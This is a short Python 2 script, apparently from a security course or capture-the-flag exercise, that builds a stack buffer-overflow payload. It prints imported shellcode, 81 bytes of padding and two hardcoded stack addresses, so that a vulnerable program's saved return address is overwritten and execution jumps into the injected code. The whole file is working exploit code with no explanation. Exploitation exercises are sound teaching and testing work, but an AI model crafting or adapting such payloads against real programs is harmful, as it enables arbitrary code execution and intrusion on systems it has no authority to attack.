from shellcode import shellcode
from struct import pack
print shellcode + "A"*(1 + 4*20) + pack("<I", 0xbffea3bc) + pack("<I", 0xbffea448)